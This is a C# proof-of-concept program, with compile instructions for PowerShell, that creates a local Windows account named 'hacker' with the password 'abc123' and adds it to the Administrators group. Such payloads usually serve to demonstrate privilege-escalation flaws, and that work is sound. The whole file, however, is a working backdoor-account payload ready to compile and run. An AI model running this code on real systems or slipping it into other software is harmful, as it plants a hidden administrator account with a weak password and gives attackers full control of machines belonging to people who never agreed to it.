/*
 * @Author: Bret McDanel
 *
 * Creates a user named "hacker" and adds them to the Administrator group
 *
 * Can be compiled by executing the following in Powershell version 5.x
 * powershell Add-Type -OutputType ConsoleApplication -Path CreateUser.cs -OutputAssembly CreateUser.exe -ReferencedAssemblies System.DirectoryServices
 */

using System;
using System.DirectoryServices;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

[assembly: global::System.Runtime.Versioning.TargetFrameworkAttribute(".NETFramework,Version=v4.7.2", FrameworkDisplayName = ".NET Framework 4.7.2")]
[assembly: AssemblyDescription("PoC to create a user named 'hacker'")]
[assembly: AssemblyConfiguration("Release")]
[assembly: AssemblyCompany("Some Company, Inc.")]
[assembly: AssemblyCopyright("Copyright © Bret McDanel 2023")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: ComVisible(false)]
[assembly: Guid("f8c3ce2f-8085-45dd-8c3a-25464294c64d")]
[assembly: AssemblyProduct("PoC")]
[assembly: AssemblyTitle("CreateUser")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]


namespace CreateUser
{
    class PoC
    {
        static void Main(string[] args)
        {
            try
            {
                DirectoryEntry AD = new DirectoryEntry(
                    "WinNT://" + Environment.MachineName + ",computer"
                );
                DirectoryEntry NewUser = AD.Children.Add("hacker", "user");
                NewUser.Invoke("SetPassword", new object[] { "abc123" });
                NewUser.Invoke("Put", new object[] { "Description", "PoC User" });
                NewUser.CommitChanges();
                DirectoryEntry grp;

                grp = AD.Children.Find("Administrators", "group");
                if (grp != null)
                {
                    grp.Invoke("Add", new object[] { NewUser.Path.ToString() });
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
